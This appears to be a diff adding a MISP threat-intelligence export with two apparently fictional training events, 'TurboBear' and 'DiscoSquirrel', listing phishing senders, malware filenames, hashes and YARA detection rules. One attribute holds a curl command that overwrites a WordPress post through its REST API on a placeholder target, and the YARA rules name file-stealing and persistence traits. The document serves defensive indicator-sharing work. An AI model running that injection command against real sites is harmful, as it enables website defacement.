@@ -1,0 +1,325 @@
+{"response":[{
+    "Event": {
+        "id": "1",
+        "orgc_id": "1",
+        "org_id": "1",
+        "date": "2017-07-26",
+        "threat_level_id": "1",
+        "info": "TurboBear campaign description",
+        "published": true,
+        "uuid": "59786151-cd5c-451f-9474-0040ac110003",
+        "attribute_count": "7",
+        "analysis": "2",
+        "timestamp": "1501238437",
+        "distribution": "3",
+        "proposal_email_lock": false,
+        "locked": true,
+        "publish_timestamp": "1501238446",
+        "sharing_group_id": "0",
+        "disable_correlation": false,
+        "event_creator_email": "admin@admin.test",
+        "Org": {
+            "id": "1",
+            "name": "WILDHAMSTERSEC",
+            "uuid": "597860b6-01fc-4535-bf38-003aac110003"
+        },
+        "Orgc": {
+            "id": "1",
+            "name": "WILDHAMSTERSEC",
+            "uuid": "597860b6-01fc-4535-bf38-003aac110003"
+        },
+        "Attribute": [
+            {
+                "id": "1",
+                "type": "email-src",
+                "category": "Payload delivery",
+                "to_ids": true,
+                "uuid": "597861a0-5900-4d85-9a09-003aac110003",
+                "event_id": "1",
+                "distribution": "5",
+                "timestamp": "1501061536",
+                "comment": "",
+                "sharing_group_id": "0",
+                "deleted": false,
+                "disable_correlation": false,
+                "value": "idelle.weaver@myorg.enisa.ex",
+                "ShadowAttribute": []
+            },
+            {
+                "id": "2",
+                "type": "email-src",
+                "category": "Payload delivery",
+                "to_ids": true,
+                "uuid": "597861a0-3738-4121-9f0e-003aac110003",
+                "event_id": "1",
+                "distribution": "5",
+                "timestamp": "1501061536",
+                "comment": "",
+                "sharing_group_id": "0",
+                "deleted": false,
+                "disable_correlation": false,
+                "value": "gloria.alberts@myorg.enisa.ex",
+                "ShadowAttribute": []
+            },
+            {
+                "id": "3",
+                "type": "email-src",
+                "category": "Payload delivery",
+                "to_ids": true,
+                "uuid": "597861a0-11b0-4124-b6c0-003aac110003",
+                "event_id": "1",
+                "distribution": "5",
+                "timestamp": "1501061536",
+                "comment": "",
+                "sharing_group_id": "0",
+                "deleted": false,
+                "disable_correlation": false,
+                "value": "allie.robinson@myorg.enisa.ex",
+                "ShadowAttribute": []
+            },
+            {
+                "id": "4",
+                "type": "filename",
+                "category": "Payload delivery",
+                "to_ids": true,
+                "uuid": "597861a0-0f98-42b9-81ec-003aac110003",
+                "event_id": "1",
+                "distribution": "5",
+                "timestamp": "1501231924",
+                "comment": "",
+                "sharing_group_id": "0",
+                "deleted": false,
+                "disable_correlation": false,
+                "value": "Invoice_no_89685958466.pdf.exe",
+                "ShadowAttribute": []
+            },
+            {
+                "id": "5",
+                "type": "sha1",
+                "category": "Payload delivery",
+                "to_ids": true,
+                "uuid": "597afb42-8850-44fd-98fe-0056ac110002",
+                "event_id": "1",
+                "distribution": "5",
+                "timestamp": "1501231938",
+                "comment": "",
+                "sharing_group_id": "0",
+                "deleted": false,
+                "disable_correlation": false,
+                "value": "f4909ac3de97dca67b6d909cfe217462563c442f",
+                "ShadowAttribute": []
+            },
+            {
+                "id": "6",
+                "type": "filename",
+                "category": "Payload delivery",
+                "to_ids": true,
+                "uuid": "597afb42-dc88-4ef7-84bf-0056ac110002",
+                "event_id": "1",
+                "distribution": "5",
+                "timestamp": "1501231938",
+                "comment": "",
+                "sharing_group_id": "0",
+                "deleted": false,
+                "disable_correlation": false,
+                "value": "TurboBear.exe",
+                "ShadowAttribute": []
+            },
+            {
+                "id": "7",
+                "type": "yara",
+                "category": "Payload delivery",
+                "to_ids": true,
+                "uuid": "597afedd-7c14-4f80-a6d4-0040ac110002",
+                "event_id": "1",
+                "distribution": "5",
+                "timestamp": "1501232861",
+                "comment": "",
+                "sharing_group_id": "0",
+                "deleted": false,
+                "disable_correlation": false,
+                "value": "rule turbo_bear : trojan\r\n{\r\n    meta:\r\n        description = \"Example for TurboBear malware\"\r\n        threat_level = \"Spam\"\r\n        in_the_wild = true\r\n\r\n    strings:\r\n        $original_file_name = \"TurboBear.exe\" wide\r\n        $computer_info_registry_entry = \"get_MachineName\" wide\r\n        $computer_info_function_name = \"SendComputerInfoToC2\"\r\n        $persistence_function_name = \"MakePersistent\"\r\n        $serializer_name = \"JavaScriptSerializer\"\r\n    \r\n    condition:\r\n        4 of them\r\n}",
+                "ShadowAttribute": []
+            }
+        ],
+        "ShadowAttribute": [],
+        "RelatedEvent": [],
+        "Galaxy": [],
+        "Tag": [
+            {
+                "id": "1",
+                "name": "tlp:green",
+                "colour": "#339900",
+                "exportable": true,
+                "hide_tag": false
+            },
+            {
+                "id": "2",
+                "name": "malware_classification:malware-category=\"Trojan\"",
+                "colour": "#284800",
+                "exportable": true,
+                "hide_tag": false
+            },
+            {
+                "id": "5",
+                "name": "ecsirt:malicious-code=\"malware\"",
+                "colour": "#004646",
+                "exportable": true,
+                "hide_tag": false
+            }
+        ]
+    }
+},{
+    "Event": {
+        "id": "2",
+        "orgc_id": "1",
+        "org_id": "1",
+        "date": "2017-07-28",
+        "threat_level_id": "1",
+        "info": "DiscoSquirrel - new threat just discovered",
+        "published": true,
+        "uuid": "597afb8c-9c7c-40dc-bac8-0129ac110002",
+        "attribute_count": "5",
+        "analysis": "1",
+        "timestamp": "1501239043",
+        "distribution": "2",
+        "proposal_email_lock": false,
+        "locked": true,
+        "publish_timestamp": "1501239206",
+        "sharing_group_id": "0",
+        "disable_correlation": false,
+        "event_creator_email": "admin@admin.test",
+        "Org": {
+            "id": "1",
+            "name": "WILDHAMSTERSEC",
+            "uuid": "597860b6-01fc-4535-bf38-003aac110003"
+        },
+        "Orgc": {
+            "id": "1",
+            "name": "WILDHAMSTERSEC",
+            "uuid": "597860b6-01fc-4535-bf38-003aac110003"
+        },
+        "Attribute": [
+            {
+                "id": "8",
+                "type": "sha1",
+                "category": "Artifacts dropped",
+                "to_ids": true,
+                "uuid": "597afb9f-1f70-4a83-98d8-0055ac110002",
+                "event_id": "2",
+                "distribution": "5",
+                "timestamp": "1501232946",
+                "comment": "",
+                "sharing_group_id": "0",
+                "deleted": false,
+                "disable_correlation": false,
+                "value": "2c12c86acad4cd34867dc93f5203c7d265fb7f11",
+                "ShadowAttribute": []
+            },
+            {
+                "id": "9",
+                "type": "filename",
+                "category": "Artifacts dropped",
+                "to_ids": true,
+                "uuid": "597afb9f-9ac0-48f7-8b33-0055ac110002",
+                "event_id": "2",
+                "distribution": "5",
+                "timestamp": "1501232958",
+                "comment": "",
+                "sharing_group_id": "0",
+                "deleted": false,
+                "disable_correlation": false,
+                "value": "DiscoSquirrel.exe",
+                "ShadowAttribute": []
+            },
+            {
+                "id": "10",
+                "type": "yara",
+                "category": "Artifacts dropped",
+                "to_ids": true,
+                "uuid": "597aff0d-17c4-40e9-a0fb-0045ac110002",
+                "event_id": "2",
+                "distribution": "5",
+                "timestamp": "1501232971",
+                "comment": "",
+                "sharing_group_id": "0",
+                "deleted": false,
+                "disable_correlation": false,
+                "value": "rule disco_squirell : trojan\r\n{\r\n    meta:\r\n        description = \"Example for DiscoSquirell malware\"\r\n        threat_level = \"APT\"\r\n        in_the_wild = true\r\n\r\n    strings:\r\n        $pdb_path = \"C:\\\\Users\\\\John\\\\documents\\\\visual studio 2017\\\\Projects\\\\DiscoSquirrel\\\\DiscoSquirrel\\\\obj\\\\Release\\\\DiscoSquirrel.pdb\"\r\n        $original_file_name = \"DiscoSquirrel.exe\" wide\r\n        $dropped_file_path = \"\\\\Microsoft\\\\Windows\\\\Explorer\\\\ExplorerDebugLog.etl\" wide\r\n        $http_request_post = \"POST\" wide\r\n        $stolen_file_extension_docx = \".docx\" wide\r\n        $stolen_file_extension_pdf = \".pdf\" wide\r\n        $persistence_function_name = \"MakePersistent\"\r\n        $fake_windows_executable = \"\\\\Microsoft\\\\Windows\\\\smss.exe\" wide\r\n    \r\n    condition:\r\n        all of them\r\n}",
+                "ShadowAttribute": []
+            },
+            {
+                "id": "11",
+                "type": "yara",
+                "category": "Artifacts dropped",
+                "to_ids": true,
+                "uuid": "597b1651-7934-4479-ad9c-0093ac110002",
+                "event_id": "2",
+                "distribution": "5",
+                "timestamp": "1501238865",
+                "comment": "",
+                "sharing_group_id": "0",
+                "deleted": false,
+                "disable_correlation": false,
+                "value": "rule inject_signature\r\n{\r\n  strings:\r\n    $systemchecker = \"systemchecker.exe\"\r\n    $inject = \"<a href=.http:\/\/[a-zA-Z0-9.-]+[.]ex.*[.]exe.>http:\/\/.*<\/a>\"\r\n\r\n  condition:\r\n    $inject and $systemchecker\r\n}",
+                "ShadowAttribute": []
+            },
+            {
+                "id": "12",
+                "type": "text",
+                "category": "Payload installation",
+                "to_ids": true,
+                "uuid": "597b1703-9034-4b4e-b79d-0096ac110002",
+                "event_id": "2",
+                "distribution": "5",
+                "timestamp": "1501239043",
+                "comment": "",
+                "sharing_group_id": "0",
+                "deleted": false,
+                "disable_correlation": false,
+                "value": "curl \"http:\/\/<target_address>\/wp-json\/wp\/v2\/posts\/3\/?id=3abc\" --data '{\"content\": \"hacked>\"}'",
+                "ShadowAttribute": []
+            }
+        ],
+        "ShadowAttribute": [],
+        "RelatedEvent": [],
+        "Galaxy": [],
+        "Tag": [
+            {
+                "id": "2",
+                "name": "malware_classification:malware-category=\"Trojan\"",
+                "colour": "#284800",
+                "exportable": true,
+                "hide_tag": false
+            },
+            {
+                "id": "3",
+                "name": "tlp:amber",
+                "colour": "#FFC000",
+                "exportable": true,
+                "hide_tag": false
+            },
+            {
+                "id": "5",
+                "name": "ecsirt:malicious-code=\"malware\"",
+                "colour": "#004646",
+                "exportable": true,
+                "hide_tag": false
+            },
+            {
+                "id": "28",
+                "name": "admiralty-scale:source-reliability=\"d\"",
+                "colour": "#0a7700",
+                "exportable": true,
+                "hide_tag": false
+            },
+            {
+                "id": "35",
+                "name": "admiralty-scale:information-credibility=\"5\"",
+                "colour": "#13ee00",
+                "exportable": true,
+                "hide_tag": false
+            }
+        ]
+    }
+}]}
